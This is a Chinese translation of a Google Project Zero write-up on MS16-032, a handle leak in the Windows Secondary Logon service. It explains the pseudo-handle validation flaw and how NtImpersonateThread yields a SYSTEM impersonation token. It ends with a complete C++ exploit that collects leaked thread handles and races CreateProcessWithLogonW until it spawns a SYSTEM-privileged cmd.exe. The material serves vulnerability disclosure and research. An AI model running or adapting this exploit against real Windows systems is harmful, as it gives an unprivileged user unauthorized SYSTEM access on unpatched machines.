# Windows Secondary Logon服务中的一个句柄权限泄露Bug

原文地址：  
[https://googleprojectzero.blogspot.jp/2016/03/exploiting-leaked-thread-handle.html](https://googleprojectzero.blogspot.jp/2016/03/exploiting-leaked-thread-handle.html)

0x00 前言
=======

* * *

原作者写了太多的从句，token handle换来换去，一大堆三四行没逗号的句子看得我头晕不已，如果手滑翻译错了，比如把令牌误打成句柄，请不要疑惑，联系我。

0x01 Bug 本貌
===========

* * *

我偶然发现了发现一个可以把在特权进程中打开的句柄泄漏到较低的特权进程的bug。Bug位于Windows Secondary Logon服务中，该漏洞可以泄漏一个具有完全访问权限的线程句柄。微软在MS16-032补丁中修复了这个bug。这篇博客将告诉你不用传统的内存损坏技术时，你将如何使用线程句柄来获得系统权限。

你可以在这里找到[issue](https://bugs.chromium.org/p/project-zero/issues/detail?id=687&redir=1)。 Secondary Logon服务存在于Windows XP+。该服务暴露了一个允许正常的进程创建一个新的、带有不同token的进程的RPC终结点。从API的角度来看此功能是通过CreateProcessWithTokenW和CreateProcessWithLogonW 暴露出来的。他们行为非常像CreateProcessAsUser，有所不同的是，它不需SeAssignPrimaryTokenPrivilege（+AsUser），而是需要SeImpersonatePrivilege来模拟令牌。登录功能很便捷，它通过登录凭据，调用LsaLogonUser并使用所产生的令牌来创建进程。

这些API采取与正常的CreateProcess相同的参数（包括传句柄给stdin/stdout/stderror时也是一样）。句柄传递的过程允许控制台进程的输出和输入重定向到其它文件。当创建一个新的进程时，这些句柄通常是通过句柄继承转移到新的进程中。在Secondary Logon的例子中，服务不是新进程的实际父进程，所以它是手动从指定的父进程使用 DuplicateHandle API 复制句柄到新进程的。代码如下

```
// Contains, hStdInput, hStdOutout and hStdError.
HANDLE StandardHandles[3] = {...};
// Location of standard handle in target process PEB.
PHANDLE HandleAddress = ...;

for(int i = 0; i < 3; ++i) {
  if (StandardHandles[i]) {
    if (StandardHandles[i] & 0x10000003) != 3 ) {
      HANDLE TargetHandle;
      if (!DuplicateHandle(ParentProcess, StandardHandles[i], 
          TargetProcess, &TargetHandle, 0, TRUE, DUPLICATE_SAME_ACCESS))
        return ERROR;
      if (!WriteProcessMemory(TargetProcess, &HandleAddress[i], 
         &TargetHandle, sizeof(TargetHandle)))
        return ERROR;
    }
  }
}

```

代码从父进程（这是RPC的调用者）复制句柄到目标进程。然后将复制的句柄的值写入到新进程PEB ProcessParameters结构中，这可以通过API，例如GetStdHandle提取。句柄值看起来以某种方式进行了标准化：它检查了该句柄的低2位是否没有设置（在NT架构的系统中句柄值总是4的倍数），但它也检查29位是否没有设置。

为了性能方面的考虑，也为了开发更简单，NT内核有一个特殊处理，允许进程使用伪句柄引用当前进程或线程，而不用由它的PID/ TID打开该对象并通过完整访问权限来获取（虽然这样也能成功）。开发人员通常会通过GetCurrentProcess和GetCurrentThread的API获取到。我们可以看到下面的代码中展示出的特例:

```
NTSTATUS ObpReferenceProcessObjectByHandle(HANDLE       SourceHandle,
                                           EPROCESS*    SourceProcess, 
                                           ..., 
                                           PVOID*       Object, 
                                           ACCESS_MASK* GrantedAccess) {
  if ((INT_PTR)SourceHandle < 0) {
    if (SourceHandle == (HANDLE)-1 ) {
      *GrantedAccess = PROCESS_ALL_ACCESS;
      *Object = SourceProcess;
      return STATUS_SUCCESS;
    } else if (SourceHandle == (HANDLE)-2) {
      *GrantedAccess = THREAD_ALL_ACCESS;
      *Object = KeGetCurrentThread();
      return STATUS_SUCCESS;
    }
    return STATUS_INVALID_HANDLE;
    
    // Get from process handle table.
}

```

现在我们可以理解为什么代码检查29位了。它检查低2位是否设置了值（伪句柄 -1，-2），但即使较高的位被设置了，也一样应该被认为是有效的句柄。这便是错误根源所在。我们可以从内核代码发现，如果指定了-1，那么源进程就有完整的访问权限。但是，并没有什么用。因为源进程已经在我们的控制之下，并没有特权。

在另一方面，如果指定-2，则对当前线程有完全访问，但是该线程实际上是Secondary Logon服务，并且它也是用来处理RPC请求的线程池之一的现成。这显然是有问题的。

唯一的问题是如何我们才可以调用CreateProcessWithToken/Logon API来作为一个普通用户启动进程？调用者需要具有SeImpersonatePrivilege才行，但你很容易会考虑到以普通用户登录时，需要一个有效的用户帐号和密码，如果我们是一个恶意用户这是可以的，但如果我们在用漏洞攻击别人的话，还是不要这样为好。仔细看了看原来有一个特殊的标志，可以让我们不需要提供有效的凭证，名为LOGON_NETCREDENTIALS_ONLY。当它与登录API一起用于连接网络资源时，主令牌是基于主叫方的。这使我们无需特殊权限或需要用户的密码去创建进程。将其组合在一起，我们可以使用下面的代码捕获一个线程句柄：

```
HANDLE GetThreadHandle() {
  PROCESS_INFORMATION procInfo = {};
  STARTUPINFO startInfo = {};
  startInfo.cb = sizeof(startInfo);

  startInfo.hStdInput = GetCurrentThread();
  startInfo.hStdOutput = GetCurrentThread();
  startInfo.hStdError = GetCurrentThread();
  startInfo.dwFlags = STARTF_USESTDHANDLES;

  CreateProcessWithLogonW(L"test", L"test", L"test", 
                          LOGON_NETCREDENTIALS_ONLY, nullptr, L"cmd.exe", 
                          CREATE_SUSPENDED, nullptr, nullptr, 
                          &startInfo, &procInfo);
  HANDLE hThread = nullptr;  
  DuplicateHandle(procInfo.hProcess, (HANDLE)0x4, 
         GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
  TerminateProcess(procInfo.hProcess, 1);
  CloseHandle(procInfo.hProcess);
  CloseHandle(procInfo.hThread);
  return hThread;
} 

```

0x02 利用
=======

* * *

利用环节。很幸运这个句柄属于一个线程池线程，这意味着该线程将用来处理其他RPC请求。如果线程只存在于服务的一个请求中，用完就渣都不剩了的话将是一个棘手很多的利用。

你可能会认为首先要设置线程上下文才能利用此泄露句柄。不管是处于调试目的还是为了要让另一个进程支持恢复执行，我们都需要用SetThreadContext。它将保存CONTEXT的状态，包括寄存器值，如RIP和RSP，当线程恢复执行时，读取保存的值就可以从指定位置执行。这似乎是一个好方法，但是肯定也有问题。

*   它只是改变了用户模式执行上下文。如果线程是在non-alertable wait状态时，直到一些未确定的情况满足时，才会开始执行。
*   由于我们没有进程句柄，所以我们不能轻易地把shellcode注到内存中，所以我们需要ROP一下绕过DEP。
*   虽然我们可以把内存注入到进程中（比如通过RPC发送一个大buffer），但是注完了我们也不知道这片东西保存到哪儿了，特别是64位那么大的地址空间。虽然我们可以调用GetThreadContext来得到一个信息泄漏，但是还不够。
*   如果出错了那么服务就崩溃了，这是我们希望避免的。
*   虽然使用SetThreadContext方法来利用成功率100%，但是十分痛苦，如果我们能够避免ROP就更好了。所以我更想要一个合乎逻辑的漏洞，而在这个例子中的漏洞性质和服务都对我们有利。

 Secondary Logon服务的全部要点是创建任意token的新进程，所以如果我们能以某种方式欺骗服务使用特权访问令牌和绕过安全限制，我们应该能够提升我们的特权。咋整？让我们来看看服务实现CreateProcessWithLogon的代码序列。

```
RpcImpersonateClient();
Process = OpenProcess(CallingProcess);
Token = OpenThreadToken(Process)
If Token IL < MEDIUM_IL Then Error;
RpcRevertToSelf();
RpcImpersonateClient();
Token = LsaLogonUser(...);
RpcRevertToSelf();
ImpersonateLoggedOnUser(Token);
CreateProcessAsUser(Token, ...);
RevertToSelf();

```

这段代码大量使用了身份模拟，因为我们已经获取了一个带有THREAD_IMPERSONATE 访问权限的线程，所以我们可以设置线程的模拟令牌。如果我们在服务调用LsaLogonUser时设置了一个有权限的模拟句柄我们可以获取一个该token的拷贝，并可以用它来创建任意进程。

如果我们能够清除模拟令牌（然后它们会退回主系统句柄）事情就会简单得多。但是不幸的是IL check阻挡了我们的脚步。如果我们在错误的时间清除了句柄OpenThreadToken将会失败，并且IL检查会拒绝访问。所以我们需要从另一个地方拿到有权限的模拟令牌。有无数种方法能做到，比如通过WebDAV与NTML协商，但是这只会增加复杂度。能不能通过其他方法不借助其他资源来拿到token呢？

有个未文档化的nt系统调用NtImpersonateThread 可以帮上忙。

```
NTSTATUS NtImpersonateThread(HANDLE ThreadHandle, 
                            HANDLE ThreadToImpersonate, 
                            PSECURITY_QUALITY_OF_SERVICE SecurityQoS)

```

这个系统调用允许你基于另一个线程的状态应用一个模拟token到一个线程上，如果源线程没有模拟token，内核就会从关联的进程主token创建一个。尽管没啥用，但是这可能让我们用同一个线程的句柄来为目标和源创建模拟。因为这是个系统服务，所以我们需要拿到一个系统模拟token。通过下面代码可以实现：

```
HANDLE GetSystemToken(HANDLE hThread) {
  // Suspend thread just in case.
  SuspendThread(hThread);

  SECURITY_QUALITY_OF_SERVICE sqos = {};
  sqos.Length = sizeof(sqos);
  sqos.ImpersonationLevel = SecurityImpersonation;
  // Clear existing thread token.
  SetThreadToken(&hThread, nullptr);
  NtImpersonateThread(hThread, hThread, &sqos);

  // Open a new copy of the token.
  HANDLE hToken = nullptr;
  OpenThreadToken(hThread, TOKEN_ALL_ACCESS, FALSE, &hToken);
  ResumeThread(hThread);

  return hToken;

｝

```

万事俱备。 我们启动一个线程来循环给泄漏的线程句柄设置系统模拟令牌。另一个线程里面我们调用CreateProcessWithLogon 直到新进程有有权限的令牌。我们能够通过检查主令牌来确定是否创建成功。因为默认情况下我们不能打开令牌，一旦我们打开了就成功了。

![p1][1]

这个简单的方法有个问题，就是线程池中有一堆线程可用，所以我们不能确保调用服务并且准确的调用到特定的线程。所以我们得运行n次，来获取到我们想要的句柄。只要我们拿到所有有可能拿到的线程的句柄，我们基本就十有八九成功了。

也许我们能通过调整线程优先级来提高可靠性。但是看起来这种方式也还可以，也不太会崩溃然后创建一个带无特权令牌的进程。在多个线程调用CreateProcessWithLogon也没有什么意义，因为服务有个全局锁防止重入。

我在文章最后粘上了利用代码。你需要确认下编译环境，位数是否正确，因为RPC调用可能会截断句柄。因为句柄值是指针，无符号数。当RPC方法转换32位句柄到64位句柄时会自动填充零，因此(DWORD)-2 不等于 (DWORD64)-2 ，会产生无效句柄值。

0x03 结论
=======

* * *

希望我通过这个文章描绘出了一个有趣的在有权限的服务中泄漏线程句柄的攻击方式。当然，它只在泄漏的线程句柄用作能够直接给予我们进程创建能力的服务，但是你也可以用这种方式创建任意文件或其他资源。你可以通过内存损坏利用技术来达到这个目的，但是你不一定需要这么做。

0x04 代码
=======

* * *

```
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <map>

#define MAX_PROCESSES 1000

HANDLE GetThreadHandle()
{
  PROCESS_INFORMATION procInfo = {};
  STARTUPINFO startInfo = {};
  startInfo.cb = sizeof(startInfo);

  startInfo.hStdInput = GetCurrentThread();
  startInfo.hStdOutput = GetCurrentThread();
  startInfo.hStdError = GetCurrentThread();
  startInfo.dwFlags = STARTF_USESTDHANDLES;

  if (CreateProcessWithLogonW(L"test", L"test", L"test", 
               LOGON_NETCREDENTIALS_ONLY, 
               nullptr, L"cmd.exe", CREATE_SUSPENDED, 
               nullptr, nullptr, &startInfo, &procInfo))
  {
    HANDLE hThread;   
    BOOL res = DuplicateHandle(procInfo.hProcess, (HANDLE)0x4, 
             GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);
    DWORD dwLastError = GetLastError();
    TerminateProcess(procInfo.hProcess, 1);
    CloseHandle(procInfo.hProcess);
    CloseHandle(procInfo.hThread);
    if (!res)
    {
      printf("Error duplicating handle %d\n", dwLastError);
      exit(1);
    }

    return hThread;
  }
  else
  {
    printf("Error: %d\n", GetLastError());
    exit(1);
  }
}

typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle, 
      HANDLE ThreadToImpersonate, 
      PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

HANDLE GetSystemToken(HANDLE hThread)
{
  SuspendThread(hThread);

  NtImpersonateThread* fNtImpersonateThread = 
     (NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"), 
                                          "NtImpersonateThread");
  SECURITY_QUALITY_OF_SERVICE sqos = {};
  sqos.Length = sizeof(sqos);
  sqos.ImpersonationLevel = SecurityImpersonation;
  SetThreadToken(&hThread, nullptr);
  NTSTATUS status = fNtImpersonateThread(hThread, hThread, &sqos);
  if (status != 0)
  {
    ResumeThread(hThread);
    printf("Error impersonating thread %08X\n", status);
    exit(1);
  }

  HANDLE hToken;
  if (!OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, 
                       FALSE, &hToken))
  {
    printf("Error opening thread token: %d\n", GetLastError());
    ResumeThread(hThread);    
    exit(1);
  }

  ResumeThread(hThread);

  return hToken;
}

struct ThreadArg
{
  HANDLE hThread;
  HANDLE hToken;
};

DWORD CALLBACK SetTokenThread(LPVOID lpArg)
{
  ThreadArg* arg = (ThreadArg*)lpArg;
  while (true)
  {
    if (!SetThreadToken(&arg->hThread, arg->hToken))
    {
      printf("Error setting token: %d\n", GetLastError());
      break;
    }
  }
  return 0;
}

int main()
{
  std::map<DWORD, HANDLE> thread_handles;
  printf("Gathering thread handles\n");

  for (int i = 0; i < MAX_PROCESSES; ++i) {
    HANDLE hThread = GetThreadHandle();
    DWORD dwTid = GetThreadId(hThread);
    if (!dwTid)
    {
      printf("Handle not a thread: %d\n", GetLastError());
      exit(1);
    }

    if (thread_handles.find(dwTid) == thread_handles.end())
    {
      thread_handles[dwTid] = hThread;
    }
    else
    {
      CloseHandle(hThread);
    }
  }

  printf("Done, got %zd handles\n", thread_handles.size());
  
  if (thread_handles.size() > 0)
  {
    HANDLE hToken = GetSystemToken(thread_handles.begin()->second);
    printf("System Token: %p\n", hToken);
    
    for (const auto& pair : thread_handles)
    {
      ThreadArg* arg = new ThreadArg;

      arg->hThread = pair.second;
      DuplicateToken(hToken, SecurityImpersonation, &arg->hToken);

      CreateThread(nullptr, 0, SetTokenThread, arg, 0, nullptr);
    }

    while (true)
    {
      PROCESS_INFORMATION procInfo = {};
      STARTUPINFO startInfo = {};
      startInfo.cb = sizeof(startInfo);     

      if (CreateProcessWithLogonW(L"test", L"test", L"test", 
              LOGON_NETCREDENTIALS_ONLY, nullptr, 
              L"cmd.exe", CREATE_SUSPENDED, nullptr, nullptr, 
              &startInfo, &procInfo))
      {
        HANDLE hProcessToken;
        // If we can't get process token good chance it's a system process.
        if (!OpenProcessToken(procInfo.hProcess, MAXIMUM_ALLOWED, 
                              &hProcessToken))
        {
          printf("Couldn't open process token %d\n", GetLastError());
          ResumeThread(procInfo.hThread);
          break;
        }
        // Just to be sure let's check the process token isn't elevated.
        TOKEN_ELEVATION elevation;
        DWORD dwSize =0;
        if (!GetTokenInformation(hProcessToken, TokenElevation, 
                              &elevation, sizeof(elevation), &dwSize))
        {
          printf("Couldn't get token elevation: %d\n", GetLastError());
          ResumeThread(procInfo.hThread);
          break;
        }

        if (elevation.TokenIsElevated)
        {
          printf("Created elevated process\n");
          break;
        }

        TerminateProcess(procInfo.hProcess, 1);
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
      }     
    }
  }

  return 0;
}
```